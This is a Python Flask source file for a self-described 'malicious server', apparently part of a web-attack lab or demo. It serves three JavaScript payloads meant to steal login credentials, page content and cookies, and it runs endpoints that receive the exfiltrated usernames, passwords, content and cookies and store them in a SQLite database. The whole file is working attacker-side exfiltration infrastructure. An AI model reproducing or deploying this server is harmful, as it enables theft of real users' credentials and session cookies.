from flask import Flask, request, send_file, make_response
from db import create_connection, insert_content, insert_credential, insert_cookie
from flask_cors import CORS
import argparse
import json


parser = argparse.ArgumentParser(description='Run an HTTPS server')
parser.add_argument('-p', '--port', type=int, default=443, help='port number to listen on')
parser.add_argument('-k', '--keyfile',type=str, default="Mserver.key", help='TLS key file')
parser.add_argument('-c', '--certfile', type=str, default="Mserver.pem", help='TLS cert file')
args = parser.parse_args()

PORT  = args.port
keyf = args.keyfile
certf = args.certfile

app = Flask(__name__)
CORS(app) # ALLOW Cross Site Request. This will set the required CORS headers on all responses returned by the application.
database = r"sqlite.db"
DIR = r"." # database folder path. To change per your need

@app.route('/', methods=['GET']) 
def index():
    return '''
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>malicious server</title>
  </head>
  <body>
    <h1>Hello! Here is malicious server!</h1>
  </body>
</html>
    '''

# payload-1, to exfiltrate credentials.
@app.route('/login.js', methods=['GET']) 
def exfiltrate_credential_js():
    print(f'\033[91m[+s] Sending malicious_login.js payload\33[0m')
    return send_file('./malicious_login.js', attachment_filename='malicious_login.js')

# payload-3, to exfiltrate content.
@app.route('/contentExf.js', methods=['GET']) 
def exfiltrate_content_js():
    print(f'\033[91m[+s] Sending malicious_iframe.js payload\33[0m')
    return send_file('./malicious_iframe.js', attachment_filename='malicious_iframe.js')


# payload-3, to exfiltrate cookies.
@app.route('/cookies.js', methods=['GET']) 
def exfiltrate_cookie_js():
    print(f'\033[91m[+s] Sending malicious_cookiesteal.js payload\33[0m')
    return send_file('./malicious_cookiesteal.js', attachment_filename='malicious_cookiesteal.js')


#save exfiltrated Content to db
@app.route('/exfiltrateContent', methods=['POST'])
def receive_data_exfiltration():
    print(f'\033[33m[+s] Receiving data exfiltration\33[0m')
    url = request.form['url']
    content = request.form['content']
    try:
        conn = create_connection(DIR,database)
        insert_content(conn,url,content)
        conn.close()
    except OSError as e:
        print(e)   
    return ('', 204)

#save exfiltrated credential to db
@app.route('/exfiltrateCredential', methods=['POST'])
def receive_credential():
    print(f'\033[33m[+s] Receiving credential!\33[0m')
    username = request.form['username']
    password = request.form['password']
    try:
        conn = create_connection(DIR,database)
        insert_credential(conn,username,password)
        conn.close()
    except OSError as e:
        print(e)
    return ('', 204)
    #return redirect('/some-other-url')


@app.route('/exfiltrateCookie',methods=['POST', 'OPTIONS'])
def receive_cookie():
    # Handle COR preflight request
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Allow-Origin', 'https://localhost:8000')
        response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
        response.headers.add('Access-Control-Allow-Methods', 'POST')
        response.headers.add('Access-Control-Allow-Credentials', 'true')
        return response
    
    print(f'\033[33m[+s] Receiving cookie exfiltration\33[0m')
    #1 get exfiltrated cookies
    json_cookies = request.get_json()
    ip = request.remote_addr
    #2 read cookies from HTTP request header  
    http_cookies = request.cookies.to_dict()

    cookies = {}
    for key in set(json_cookies.keys()).union(set(http_cookies.keys())):
        if key in json_cookies and key in http_cookies:
            if json_cookies[key] == http_cookies[key]:
                cookies[key] = json_cookies[key]
        else:
            if key in json_cookies:
                cookies[key] = json_cookies[key]
            else:
                cookies[key] = http_cookies[key]
    try:
        conn = create_connection(DIR,database)
        for key, value in cookies.items():
            insert_cookie(conn,ip,key+":"+value)
    except OSError as e:
        print(e)
    response = make_response()
    response.headers.add('Access-Control-Allow-Origin', 'https://localhost:8000')
    response.headers.add('Access-Control-Allow-Credentials', 'true')
    return(response, 204)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, ssl_context=(certf,keyf))
